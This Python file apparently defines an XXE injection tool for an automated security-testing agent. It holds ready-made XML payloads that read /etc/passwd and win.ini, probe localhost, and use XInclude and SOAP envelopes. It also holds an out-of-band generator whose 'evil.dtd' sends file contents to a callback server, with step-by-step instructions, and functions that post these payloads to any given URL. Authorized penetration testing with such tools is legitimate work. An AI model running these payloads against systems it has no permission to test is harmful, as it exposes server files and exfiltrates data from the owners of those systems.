"""XXE (XML External Entity) injection testing tool."""

from __future__ import annotations

from typing import Any, Literal

import requests

from strix.tools.registry import register_tool
from strix.tools.validation import (
    generate_usage_hint,
    validate_action_param,
    validate_required_param,
    validate_unknown_params,
)


XXEAction = Literal["test_basic", "test_oob", "generate_payload", "test_endpoint"]


# XXE payloads for different scenarios
XXE_PAYLOADS = {
    "basic_file": """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>""",
    "basic_file_windows": """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>
<root>&xxe;</root>""",
    "basic_http": """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:80/">]>
<root>&xxe;</root>""",
    "parameter_entity": """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]>
<root></root>""",
    "xinclude": """<?xml version="1.0" encoding="UTF-8"?>
<root xmlns:xi="http://www.w3.org/2001/XInclude">
    <xi:include parse="text" href="file:///etc/passwd"/>
</root>""",
    "soap": """<?xml version="1.0" encoding="UTF-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
    <soap:Body>
        <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
        <foo>&xxe;</foo>
    </soap:Body>
</soap:Envelope>""",
}


def _generate_oob_payload(callback_url: str, target_file: str = "/etc/hostname") -> dict[str, str]:
    """Generate out-of-band XXE payload."""
    dtd_payload = f"""<!ENTITY % file SYSTEM "file://{target_file}">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM '{callback_url}?data=%file;'>">
%eval;
%exfil;"""
    
    xml_payload = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "{callback_url}/evil.dtd"> %xxe;]>
<root></root>"""
    
    return {
        "dtd": dtd_payload,
        "xml": xml_payload
    }


def _test_xxe_basic(url: str, timeout: int = 10) -> dict[str, Any]:
    """Test basic XXE injection."""
    results = {
        "vulnerable": False,
        "tests": [],
        "findings": []
    }
    
    headers = {"Content-Type": "application/xml"}
    
    for payload_name, payload in XXE_PAYLOADS.items():
        try:
            response = requests.post(
                url,
                data=payload,
                headers=headers,
                timeout=timeout,
                allow_redirects=False
            )
            
            test_result = {
                "payload_type": payload_name,
                "status_code": response.status_code,
                "response_length": len(response.text),
                "indicators": []
            }
            
            # Check for file content indicators
            response_lower = response.text.lower()
            if "root:" in response_lower or "/bin/bash" in response_lower:
                test_result["indicators"].append("Unix passwd file content detected")
                results["vulnerable"] = True
                results["findings"].append(f"XXE vulnerability detected with {payload_name}")
            
            if "[extensions]" in response_lower or "[fonts]" in response_lower:
                test_result["indicators"].append("Windows INI file content detected")
                results["vulnerable"] = True
                results["findings"].append(f"XXE vulnerability detected with {payload_name}")
            
            # Check for error messages
            if any(err in response_lower for err in ["external entity", "doctype", "xml", "parser"]):
                test_result["indicators"].append("XML parser error detected")
            
            results["tests"].append(test_result)
            
        except requests.exceptions.RequestException as e:
            results["tests"].append({
                "payload_type": payload_name,
                "error": str(e)
            })
    
    return results


def _generate_xxe_payload(payload_type: str, target: str = "/etc/passwd", callback_url: str | None = None) -> str:
    """Generate XXE payload."""
    if payload_type == "basic_file":
        return f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file://{target}">]>
<root>&xxe;</root>"""
    
    elif payload_type == "basic_http":
        target_url = callback_url or target
        return f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "{target_url}">]>
<root>&xxe;</root>"""
    
    elif payload_type == "xinclude":
        return f"""<?xml version="1.0" encoding="UTF-8"?>
<root xmlns:xi="http://www.w3.org/2001/XInclude">
    <xi:include parse="text" href="file://{target}"/>
</root>"""
    
    elif payload_type == "oob" and callback_url:
        return _generate_oob_payload(callback_url, target)["xml"]
    
    elif payload_type == "soap":
        return f"""<?xml version="1.0" encoding="UTF-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
    <soap:Body>
        <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file://{target}">]>
        <foo>&xxe;</foo>
    </soap:Body>
</soap:Envelope>"""
    
    else:
        return XXE_PAYLOADS.get(payload_type, XXE_PAYLOADS["basic_file"])


@register_tool
def xxe_tester(
    action: XXEAction,
    url: str | None = None,
    payload_type: str = "basic_file",
    target_file: str = "/etc/passwd",
    callback_url: str | None = None,
    timeout: int = 10
) -> str:
    """Test for XXE (XML External Entity) injection vulnerabilities.
    
    Tests various XXE attack vectors including basic file disclosure,
    HTTP requests, out-of-band techniques, and XInclude.
    
    Args:
        action: Action to perform
            - test_basic: Test basic XXE payloads on endpoint
            - test_oob: Generate out-of-band XXE payload
            - generate_payload: Generate specific XXE payload
            - test_endpoint: Test endpoint with custom payload
        url: Target URL for testing (required for test_* actions)
        payload_type: Type of payload (basic_file, basic_http, xinclude, soap, oob)
        target_file: File path to target (default: /etc/passwd)
        callback_url: Callback URL for OOB attacks
        timeout: Request timeout in seconds
    
    Returns:
        Test results or generated payload
    """
    if action == "test_basic":
        if not url:
            return "Error: URL required for testing"
        
        results = _test_xxe_basic(url, timeout)
        
        output = ["XXE Testing Results", "=" * 50, ""]
        output.append(f"Target: {url}")
        output.append(f"Vulnerable: {results['vulnerable']}")
        output.append("")
        
        if results["findings"]:
            output.append("Findings:")
            for finding in results["findings"]:
                output.append(f"  • {finding}")
            output.append("")
        
        output.append("Test Details:")
        for test in results["tests"]:
            output.append(f"\nPayload: {test['payload_type']}")
            if "error" in test:
                output.append(f"  Error: {test['error']}")
            else:
                output.append(f"  Status: {test['status_code']}")
                output.append(f"  Response Length: {test['response_length']}")
                if test.get("indicators"):
                    output.append("  Indicators:")
                    for indicator in test["indicators"]:
                        output.append(f"    - {indicator}")
        
        return "\n".join(output)
    
    elif action == "test_oob":
        if not callback_url:
            return "Error: callback_url required for OOB testing"
        
        payloads = _generate_oob_payload(callback_url, target_file)
        
        output = ["Out-of-Band XXE Payload", "=" * 50, ""]
        output.append("Step 1: Host this DTD at {}/evil.dtd:".format(callback_url))
        output.append("```xml")
        output.append(payloads["dtd"])
        output.append("```")
        output.append("")
        output.append("Step 2: Send this XML payload:")
        output.append("```xml")
        output.append(payloads["xml"])
        output.append("```")
        output.append("")
        output.append("Step 3: Monitor your callback server for requests containing file data")
        
        return "\n".join(output)
    
    elif action == "generate_payload":
        payload = _generate_xxe_payload(payload_type, target_file, callback_url)
        
        output = ["Generated XXE Payload", "=" * 50, ""]
        output.append(f"Type: {payload_type}")
        output.append(f"Target: {target_file}")
        if callback_url:
            output.append(f"Callback: {callback_url}")
        output.append("")
        output.append("```xml")
        output.append(payload)
        output.append("```")
        
        return "\n".join(output)
    
    elif action == "test_endpoint":
        if not url:
            return "Error: URL required for testing"
        
        payload = _generate_xxe_payload(payload_type, target_file, callback_url)
        
        try:
            headers = {"Content-Type": "application/xml"}
            response = requests.post(
                url,
                data=payload,
                headers=headers,
                timeout=timeout,
                allow_redirects=False
            )
            
            output = ["XXE Endpoint Test", "=" * 50, ""]
            output.append(f"URL: {url}")
            output.append(f"Payload Type: {payload_type}")
            output.append(f"Status Code: {response.status_code}")
            output.append(f"Response Length: {len(response.text)}")
            output.append("")
            
            # Check for indicators
            indicators = []
            response_lower = response.text.lower()
            if "root:" in response_lower or "/bin/bash" in response_lower:
                indicators.append("✓ Unix passwd file content detected")
            if "[extensions]" in response_lower or "[fonts]" in response_lower:
                indicators.append("✓ Windows INI file content detected")
            if any(err in response_lower for err in ["external entity", "doctype", "xml"]):
                indicators.append("⚠ XML parser error detected")
            
            if indicators:
                output.append("Indicators:")
                for indicator in indicators:
                    output.append(f"  {indicator}")
                output.append("")
            
            output.append("Response Preview (first 500 chars):")
            output.append(response.text[:500])
            
            return "\n".join(output)
            
        except requests.exceptions.RequestException as e:
            return f"Error testing endpoint: {str(e)}"
    
    return "Invalid action. Use: test_basic, test_oob, generate_payload, test_endpoint"
